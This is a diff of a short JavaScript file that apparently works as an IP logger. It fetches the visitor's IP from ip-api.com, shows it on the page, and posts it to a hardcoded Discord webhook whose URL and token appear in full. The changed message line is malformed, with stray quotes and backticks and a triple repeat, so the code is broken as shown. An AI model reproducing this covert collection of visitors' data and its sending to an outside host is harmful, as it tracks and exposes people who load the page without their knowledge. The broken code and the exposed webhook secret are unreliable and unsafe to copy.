@@ -1,13 +1,13 @@
 const whurl = "https://discord.com/api/webhooks/1246559249325097052/UzuMt97coTW1187qKif_WXZnHvLg4n-1C_M0NsBYtP2OBDDVv5RbZy3IZZMh33lzagkB";
 
-fetch("https://api.ipify.org?format=json")
+fetch("http://ip-api.com/json/")
     .then(response => response.json())
     .then(json => {
-        const ip = json.ip;
-        document.getElementById("IP").innerHTML = ip;
+        const query = json.query;
+        document.getElementById("query").innerHTML = query;
 
         const msg = {
-            "content": `ip - ${ip}`
+            ""content": `query - ${query}\n query - ${query}\n query - ${query}``
         };
 
         return fetch(whurl + "?wait=true", {
